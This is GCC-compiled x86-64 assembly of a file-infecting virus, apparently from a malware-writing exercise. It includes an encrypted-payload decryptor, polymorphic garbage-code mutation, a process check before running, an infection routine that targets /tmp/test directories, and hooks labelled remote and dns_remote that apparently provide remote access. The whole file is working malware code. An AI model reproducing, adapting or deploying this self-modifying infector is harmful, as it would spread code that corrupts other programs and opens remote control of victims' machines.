	.file	"main.c"
	.comm	bin_start,8,8
	.comm	cmpr_start,8,8
	.comm	cmpr_end,8,8
	.comm	crypt_start,8,8
	.comm	crypt_end,8,8
	.comm	bin_end,8,8
	.section	.textearly,"ax",@progbits
	.globl	DECRYPT_ROUTINE
	.type	DECRYPT_ROUTINE, @function
DECRYPT_ROUTINE:
.LFB22:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	%rsi, -16(%rbp)
	movq	%rdx, -24(%rbp)
#APP
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 15 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 16 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 17 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 18 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 19 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 20 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 21 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 22 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 23 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 24 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 25 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 26 "virus/main.c" 1
	nop
# 0 "" 2
# 27 "virus/main.c" 1
	nop
# 0 "" 2
# 27 "virus/main.c" 1
	nop
# 0 "" 2
# 27 "virus/main.c" 1
	nop
# 0 "" 2
# 27 "virus/main.c" 1
	nop
# 0 "" 2
# 27 "virus/main.c" 1
	nop
# 0 "" 2
# 27 "virus/main.c" 1
	nop
# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE22:
	.size	DECRYPT_ROUTINE, .-DECRYPT_ROUTINE
	.text
	.globl	ft_rand
	.type	ft_rand, @function
ft_rand:
.LFB23:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	seed(%rip), %rax
	imulq	$48271, %rax, %rcx
	movabsq	$8589934597, %rdx
	movq	%rcx, %rax
	mulq	%rdx
	movq	%rcx, %rax
	subq	%rdx, %rax
	shrq	%rax
	addq	%rdx, %rax
	shrq	$30, %rax
	movq	%rax, %rdx
	salq	$31, %rdx
	subq	%rax, %rdx
	movq	%rcx, %rax
	subq	%rdx, %rax
	movq	%rax, seed(%rip)
	movq	seed(%rip), %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE23:
	.size	ft_rand, .-ft_rand
	.globl	ft_srand
	.type	ft_srand, @function
ft_srand:
.LFB24:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	fingerprint(%rip), %rax
	movq	%rax, seed(%rip)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE24:
	.size	ft_srand, .-ft_srand
	.globl	change_garbage_code
	.type	change_garbage_code, @function
change_garbage_code:
.LFB25:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	$0, %eax
	call	ft_srand
	leaq	cmpr_start(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movl	%eax, -12(%rbp)
	leaq	crypt_start(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movl	%eax, -16(%rbp)
	leaq	crypt_end(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movl	%eax, -20(%rbp)
	movq	$0, -8(%rbp)
	jmp	.L6
.L8:
	movq	-8(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	leaq	4+garbage_table(%rip), %rax
	movl	(%rdx,%rax), %eax
	movq	-8(%rbp), %rdx
	leaq	0(,%rdx,8), %rcx
	leaq	garbage_table(%rip), %rdx
	movl	(%rcx,%rdx), %edx
	movl	%edx, %ecx
	leaq	bin_start(%rip), %rdx
	addq	%rcx, %rdx
	movl	%eax, %esi
	movq	%rdx, %rdi
	movl	$0, %eax
	call	generate_garb@PLT
	addq	$1, -8(%rbp)
.L6:
	movl	garbage_table_len(%rip), %eax
	movl	%eax, %eax
	cmpq	-8(%rbp), %rax
	ja	.L8
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE25:
	.size	change_garbage_code, .-change_garbage_code
	.section	.textcmpr,"ax",@progbits
	.globl	decryptHiddenCode
	.type	decryptHiddenCode, @function
decryptHiddenCode:
.LFB26:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	leaq	key(%rip), %rax
	movq	%rax, -16(%rbp)
	leaq	crypt_end(%rip), %rdx
	leaq	crypt_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -24(%rbp)
	leaq	crypt_start(%rip), %rax
	movq	%rax, -32(%rbp)
	movb	$48, environ(%rip)
	movq	iscompressed(%rip), %rax
	movl	%eax, %ecx
	movq	-16(%rbp), %rdx
	movq	-24(%rbp), %rsi
	movq	-32(%rbp), %rax
	leaq	DECRYPT_ROUTINE(%rip), %r8
	movq	%rax, %rdi
	call	decrypt@PLT
	cmpq	$-1, %rax
	jne	.L10
	movl	$0, %eax
	jmp	.L11
.L10:
	movb	$49, environ(%rip)
	movl	$0, -4(%rbp)
	jmp	.L12
.L14:
	movl	-4(%rbp), %eax
	movslq	%eax, %rdx
	leaq	test_area(%rip), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$65, %al
	je	.L13
	movl	$0, %eax
	jmp	.L11
.L13:
	addl	$1, -4(%rbp)
.L12:
	cmpl	$14, -4(%rbp)
	jle	.L14
	movb	$51, environ(%rip)
	movl	$1, %eax
.L11:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE26:
	.size	decryptHiddenCode, .-decryptHiddenCode
	.section	.rodata
.LC0:
	.string	"/tmp/test"
.LC1:
	.string	"/tmp/test2"
	.text
	.globl	do_infection
	.type	do_infection, @function
do_infection:
.LFB27:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$192, %rsp
	leaq	bin_start(%rip), %rax
	movq	%rax, -8(%rbp)
	leaq	bin_end(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -16(%rbp)
	leaq	cmpr_start(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -24(%rbp)
	leaq	cmpr_end(%rip), %rdx
	leaq	cmpr_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -32(%rbp)
	leaq	crypt_start(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -40(%rbp)
	leaq	crypt_end(%rip), %rdx
	leaq	crypt_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -48(%rbp)
	leaq	DECRYPT_ROUTINE(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -56(%rbp)
	leaq	data(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -64(%rbp)
	leaq	dataearly(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -72(%rbp)
	leaq	_infect_push(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -80(%rbp)
	leaq	_infect_pop(%rip), %rdx
	leaq	bin_start(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -88(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, -192(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, -184(%rbp)
	movq	-24(%rbp), %rax
	movq	%rax, -176(%rbp)
	movq	-32(%rbp), %rax
	movq	%rax, -168(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -160(%rbp)
	movq	-48(%rbp), %rax
	movq	%rax, -152(%rbp)
	movq	-56(%rbp), %rax
	movq	%rax, -144(%rbp)
	leaq	DECRYPT_ROUTINE(%rip), %rax
	movq	%rax, -136(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, -128(%rbp)
	movq	-72(%rbp), %rax
	movq	%rax, -120(%rbp)
	movq	-80(%rbp), %rax
	movq	%rax, -112(%rbp)
	movq	-88(%rbp), %rax
	movq	%rax, -104(%rbp)
	movl	opt(%rip), %eax
	pushq	-104(%rbp)
	pushq	-112(%rbp)
	pushq	-120(%rbp)
	pushq	-128(%rbp)
	pushq	-136(%rbp)
	pushq	-144(%rbp)
	pushq	-152(%rbp)
	pushq	-160(%rbp)
	pushq	-168(%rbp)
	pushq	-176(%rbp)
	pushq	-184(%rbp)
	pushq	-192(%rbp)
	movl	%eax, %esi
	leaq	.LC0(%rip), %rdi
	call	infect_dir@PLT
	addq	$96, %rsp
	movl	opt(%rip), %eax
	pushq	-104(%rbp)
	pushq	-112(%rbp)
	pushq	-120(%rbp)
	pushq	-128(%rbp)
	pushq	-136(%rbp)
	pushq	-144(%rbp)
	pushq	-152(%rbp)
	pushq	-160(%rbp)
	pushq	-168(%rbp)
	pushq	-176(%rbp)
	pushq	-184(%rbp)
	pushq	-192(%rbp)
	movl	%eax, %esi
	leaq	.LC1(%rip), %rdi
	call	infect_dir@PLT
	addq	$96, %rsp
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE27:
	.size	do_infection, .-do_infection
	.section	.rodata
.LC2:
	.string	"[I am a bad virus]"
	.text
	.globl	virus
	.type	virus, @function
virus:
.LFB28:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movzbl	1+opt(%rip), %eax
	testb	%al, %al
	je	.L17
	call	remote@PLT
.L17:
	movzbl	2+opt(%rip), %eax
	testb	%al, %al
	je	.L18
	call	dns_remote@PLT
.L18:
	movzbl	3+opt(%rip), %eax
	testb	%al, %al
	je	.L19
	leaq	.LC2(%rip), %rdi
	call	println@PLT
.L19:
	movl	$0, %eax
	call	change_garbage_code
	movl	$0, %eax
	call	do_infection
	movl	$1, %eax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE28:
	.size	virus, .-virus
	.section	.textcmpr
	.globl	print_debugging
	.type	print_debugging, @function
print_debugging:
.LFB29:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movb	$68, -14(%rbp)
	movb	$69, -13(%rbp)
	movb	$66, -12(%rbp)
	movb	$85, -11(%rbp)
	movb	$71, -10(%rbp)
	movb	$71, -9(%rbp)
	movb	$73, -8(%rbp)
	movb	$78, -7(%rbp)
	movb	$71, -6(%rbp)
	movb	$46, -5(%rbp)
	movb	$46, -4(%rbp)
	movb	$46, -3(%rbp)
	movb	$10, -2(%rbp)
	movb	$0, -1(%rbp)
	leaq	-14(%rbp), %rax
	movl	$1, %ecx
	movl	$13, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	call@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE29:
	.size	print_debugging, .-print_debugging
	.globl	entry
	.type	entry, @function
entry:
.LFB30:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movb	$116, -5(%rbp)
	movb	$101, -4(%rbp)
	movb	$115, -3(%rbp)
	movb	$116, -2(%rbp)
	movb	$0, -1(%rbp)
	movb	$0, 1+environ(%rip)
	movb	$0, 2+environ(%rip)
	movb	$63, environ(%rip)
	leaq	-5(%rbp), %rax
	movq	%rax, %rdi
	call	checkproc@PLT
	testl	%eax, %eax
	jne	.L23
	movb	$33, environ(%rip)
	movl	$0, %eax
	jmp	.L27
.L23:
	leaq	key(%rip), %rax
	leaq	key(%rip), %rdx
	movzbl	(%rdx), %edx
	xorl	$114, %edx
	movb	%dl, (%rax)
	movl	$0, %eax
	call	decryptHiddenCode
	testl	%eax, %eax
	je	.L25
	call	virus
	testl	%eax, %eax
	je	.L25
	movl	$1, %eax
	jmp	.L27
.L25:
	movl	$0, %eax
.L27:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE30:
	.size	entry, .-entry
	.ident	"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",@progbits
